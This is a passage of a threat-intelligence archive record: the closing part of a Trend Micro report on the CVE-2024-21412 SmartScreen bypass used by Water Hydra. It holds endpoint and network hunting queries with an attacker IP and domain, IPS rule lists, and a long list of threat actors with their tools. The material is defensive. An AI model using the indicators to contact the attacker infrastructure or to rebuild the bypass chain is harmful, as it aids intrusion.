OR\nobjectCmd:.cmd)\n\n(productCode:sds OR productCode:pds OR productCode:xes OR productCode:sao) AND eventId:1\nAND eventSubId:2 AND objectCmd:\"rundll32.exe\" AND objectCmd:/underwall/ AND ( objectCmd:.url\nOR objectCmd:.cmd)\n\neventId:\"100101\" AND (request:\"*84.32.189.74*\" OR request:\"87iavv.com\")\n\neventId:3 AND (src:\"84.32.189.74*\" OR dst:\"84.32.189.74*\")\n\nproductCode:(pdi OR xns OR pds OR sds OR stp OR ptp OR xcs) AND (eventId:(100115 OR 100119)\nOR eventName:INTRUSION_DETECTION) AND (src:\"84.32.189.74*\" OR dst:\"84.32.189.74*\")\n\n**Trend Micro Cloud One - Network Security & TippingPoint Filters**\n\n43700 - HTTP: Microsoft Windows Internet Shortcut SmartScreen Bypass Vulnerability\n43701 - ZDI-CAN-23100: Zero Day Initiative Vulnerability (Microsoft Windows SmartScreen)\n43266 - TCP: Backdoor.Win32.DarkMe.A Runtime Detection\n\n**Trend Vision One Network Sensor and Trend Micro Deep Discovery Inspector (DDI) Rule**\n\n4983: CVE-2024-21412 - Microsoft Windows SmartScreen Exploit - HTTP(Response)\n\n**Trend Vision One Endpoint Security, Trend Cloud One - Workload and Endpoint Security, Deep**\n**Security and Vulnerability Protection IPS Rules**\n\n1011949 - Microsoft Windows Internet Shortcut SmartScreen Bypass Vulnerability (CVE-202421412)\n1011950 - Microsoft Windows Internet Shortcut SmartScreen Bypass Vulnerability Over\nSMB (CVE-2024-21412)\n1011119 - Disallow Download Of Restricted File Formats (ATT&CK T1105)\n1004294 - Identified Microsoft Windows Shortcut File Over WebDav\n1005269 - Identified Download Of DLL File Over WebDav (ATT&CK T1574.002)\n1006014 - Identified Microsoft BAT And CMD Files Over WebDav\n\n\n-----\n\n## Indicators of Compromise\n\n[The indicators of compromise for this entry can be found here.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-smartscreen-zero-day/ioc-list-water-hydra-cve-2024-21412.txt)\n\nAcknowledgments\n\nThe Zero Day Initiative would like to thank the following Trenders for their contributions in ensuring that\nTrend Micro customers were protected from this zero-day attack pre-patching:\n\n_Scott Graham, Mohamad Mokbel, Abdelrahman Esmail, Simon Dulude, Senthil Nathan Sankar, Amit_\n_Kumar, and a special thanks to the content writers and marketing teams for helping with this research._\n\nWe would like to thank the Microsoft Security Response Center (MSRC) team for their continued\ncollaboration and their efforts in deploying a patch in a timely manner.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2024/2024.02.13.Water_Hydra/CVE-2024-21412_%20Water%20Hydra%20Targets%20Traders%20with%20Microsoft%20Defender%20SmartScreen%20Zero-Day.pdf"
    ],
    "report_names": [
        "CVE-2024-21412_ Water Hydra Targets Traders with Microsoft Defender SmartScreen Zero-Day"
    ],
    "threat_actors": [
        {
            "id": "059b16f8-d4e0-4399-9add-18101a2fd298",
            "created_at": "2022-10-25T15:50:23.29434Z",
            "updated_at": "2025-03-27T02:00:55.431907Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "Evilnum"
            ],
            "source_name": "MITRE:Evilnum",
            "tools": [
                "More_eggs",
                "EVILNUM",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "0bc63952-5795-4fc7-85c1-50a7f207f2f0",
            "created_at": "2023-11-14T02:00:07.095723Z",
            "updated_at": "2025-03-27T02:00:03.223759Z",
            "deleted_at": null,
            "main_name": "DarkCasino",
            "aliases": [],
            "source_name": "MISPGALAXY:DarkCasino",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "39ea99fb-1704-445d-b5cd-81e7c99d6012",
            "created_at": "2022-10-25T16:07:23.601894Z",
            "updated_at": "2025-03-27T02:02:09.882982Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "Jointworm",
                "Operation Phantom in the [Command] Shell",
                "TA4563"
            ],
            "source_name": "ETDA:Evilnum",
            "tools": [
                "Bypass-UAC",
                "Cardinal RAT",
                "ChromeCookiesView",
                "EVILNUM",
                "Evilnum",
                "IronPython",
                "LaZagne",
                "MailPassView",
                "More_eggs",
                "ProduKey",
                "PyVil",
                "PyVil RAT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Taurus Loader TeamViewer Module",
                "Terra Loader",
                "TerraPreter",
                "TerraStealer",
                "TerraTV"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "fd4c3ddd-11cc-4192-9c94-ff107d7f8492",
            "created_at": "2023-02-18T02:04:24.06294Z",
            "updated_at": "2025-03-27T02:02:09.850008Z",
            "deleted_at": null,
            "main_name": "Dark Pink",
            "aliases": [
                "Saaiwc Group"
            ],
            "source_name": "ETDA:Dark Pink",
            "tools": [
                "Ctealer",
                "Cucky",
                "KamiKakaBot",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "PowerSploit",
                "TelePowerBot",
                "ZMsg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8a33d3ac-14ba-441c-92c1-39975e9e1a73",
            "created_at": "2023-01-06T13:46:39.195689Z",
            "updated_at": "2025-03-27T02:00:03.01861Z",
            "deleted_at": null,
            "main_name": "Ghostwriter",
            "aliases": [
                "PUSHCHA",
                "Storm-0257",
                "DEV-0257",
                "UAC-0057",
                "UNC1151",
                "TA445"
            ],
            "source_name": "MISPGALAXY:Ghostwriter",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a5bd315b-6220-441f-8ed1-39e194dcd0e3",
            "created_at": "2023-12-01T02:02:33.667762Z",
            "updated_at": "2025-03-27T02:02:09.84638Z",
            "deleted_at": null,
            "main_name": "DarkCasino",
            "aliases": [
                "Water Hydra"
            ],
            "source_name": "ETDA:DarkCasino",
            "tools": [
                "CloudEyE",
                "DarkMe",
                "GuLoader",
                "PikoloRAT",
                "vbdropper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "16f2436b-5f84-44e3-a306-f1f9e92f7bea",
            "created_at": "2023-01-06T13:46:38.745572Z",
            "updated_at": "2025-03-27T02:00:02.907444Z",
            "deleted_at": null,
            "main_name": "APT40",
            "aliases": [
                "ISLANDDREAMS",
                "TEMP.Jumper",
                "BRONZE MOHAWK",
                "GADOLINIUM",
                "KRYPTONITE PANDA",
                "TA423",
                "MUDCARP",
                "Gingham Typhoon",
                "TEMP.Periscope",
                "G0065",
                "ATK29",
                "Red Ladon",
                "ITG09"
            ],
            "source_name": "MISPGALAXY:APT40",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8ce861d7-7fbd-4d9c-a211-367c118bfdbd",
            "created_at": "2023-01-06T13:46:39.153487Z",
            "updated_at": "2025-03-27T02:00:03.009422Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "TA4563",
                "EvilNum",
                "Jointworm",
                "KNOCKOUT SPIDER",
                "DeathStalker"
            ],
            "source_name": "MISPGALAXY:Evilnum",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b43c8747-c898-448a-88a9-76bff88e91b5",
            "created_at": "2024-02-02T02:00:04.058535Z",
            "updated_at": "2025-03-27T02:00:03.302832Z",
            "deleted_at": null,
            "main_name": "Opal Sleet",
            "aliases": [
                "OSMIUM",
                "Konni",
                "Vedalia"
            ],
            "source_name": "MISPGALAXY:Opal Sleet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "59be3740-c8c7-47aa-84c8-e80d0cb7ea3a",
            "created_at": "2022-10-25T15:50:23.481057Z",
            "updated_at": "2025-03-27T02:00:55.480695Z",
            "deleted_at": null,
            "main_name": "Leviathan",
            "aliases": [
                "MUDCARP",
                "Kryptonite Panda",
                "Gadolinium",
                "BRONZE MOHAWK",
                "TEMP.Jumper",
                "APT40",
                "TEMP.Periscope",
                "Gingham Typhoon"
            ],
            "source_name": "MITRE:Leviathan",
            "tools": [
                "Windows Credential Editor",
                "BITSAdmin",
                "HOMEFRY",
                "Derusbi",
                "at",
                "BLACKCOFFEE",
                "BADFLICK",
                "gh0st RAT",
                "PowerSploit",
                "MURKYTOP",
                "NanHaiShu",
                "Orz",
                "Cobalt Strike",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b9458777-d970-4e89-b2d2-e532140a390f",
            "created_at": "2024-05-01T02:03:08.140328Z",
            "updated_at": "2025-03-27T02:05:17.41728Z",
            "deleted_at": null,
            "main_name": "NICKEL JUNIPER",
            "aliases": [
                "OSMIUM ",
                "Opal Sleet ",
                "Konni"
            ],
            "source_name": "Secureworks:NICKEL JUNIPER",
            "tools": [
                "KONNI"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "83025f5e-302e-46b0-baf6-650a4d313dfc",
            "created_at": "2024-05-01T02:03:07.971863Z",
            "updated_at": "2025-03-27T02:05:17.278721Z",
            "deleted_at": null,
            "main_name": "BRONZE MOHAWK",
            "aliases": [
                "Flaccid Rose ",
                "GADOLINIUM ",
                "Kryptonite Panda ",
                "Leviathan ",
                "Nanhaishu ",
                "Pickleworm ",
                "Temp.Jumper ",
                "Temp.Periscope ",
                "APT40 "
            ],
            "source_name": "Secureworks:BRONZE MOHAWK",
            "tools": [
                " BlackCoffee",
                " China Chopper",
                " Cobalt Strike",
                " Derusbi",
                " Derusbi Trojan",
                " FUSIONBLAZE",
                " GreenCrash",
                " HOMEFRY",
                " MURKYTOP",
                " Metasploit",
                " Metasploit / Meterpreter",
                " Nanhaishu",
                " Orz",
                " ScanBox",
                " SeDll",
                "AIRBREAK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1708135557,
    "ts_updated_at": 1743041836,
    "ts_creation_date": 1708061587,
    "ts_modification_date": 1708061587,
    "files": {
        "pdf": "https://archive.orkl.eu/edb8c33bf3b3cf5cf4ae6236d90fc3b6ea5210c1.pdf",
        "text": "https://archive.orkl.eu/edb8c33bf3b3cf5cf4ae6236d90fc3b6ea5210c1.txt",
        "img": "https://archive.orkl.eu/edb8c33bf3b3cf5cf4ae6236d90fc3b6ea5210c1.jpg"
    }
}